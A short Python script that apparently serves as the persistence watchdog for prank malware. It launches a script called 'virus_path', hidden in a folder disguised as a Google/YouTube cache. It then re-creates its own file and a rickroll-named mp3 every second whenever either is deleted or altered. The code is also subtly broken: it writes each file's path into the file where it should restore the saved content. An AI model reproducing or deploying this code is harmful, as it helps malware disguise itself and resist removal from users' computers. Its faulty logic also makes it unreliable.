import os, time, sys
from multiprocessing import Process

PYTHON_COMMAND = sys.executable
# Backup file, file to check
files_to_backup = [
  (__file__, __file__),
  ("%USERPROFILE%/Downloads/Google_Stable_x64/assets/cache/youtube_com-watch-dQw4w9WgXcQ.mp3".replace("/", "\\"), "%USERPROFILE%/Music/youtube_com-watch-dQw4w9WgXcQ.mp3".replace("/", "\\"))
]

backuped_files = [open(path, "r").read() for path, _ in files_to_backup]

virus_path = "%USERPROFILE%/Downloads/Google_Stable_x64/assets/cache/youtube_com.py".replace("/", "\\")

start_virus = lambda: os.system(f"{PYTHON_COMMAND} {virus_path}")
virus_thread = Process(target=start_virus)
virus_thread.start()


while True:
  for index, file_paths in enumerate(files_to_backup):
    backup = backuped_files[index]
    for path in file_paths:
      if not os.path.exists(path) or open(path, "r").read() != backup:
        with open(path, "w") as file:
          file.write(path)
  time.sleep(1)

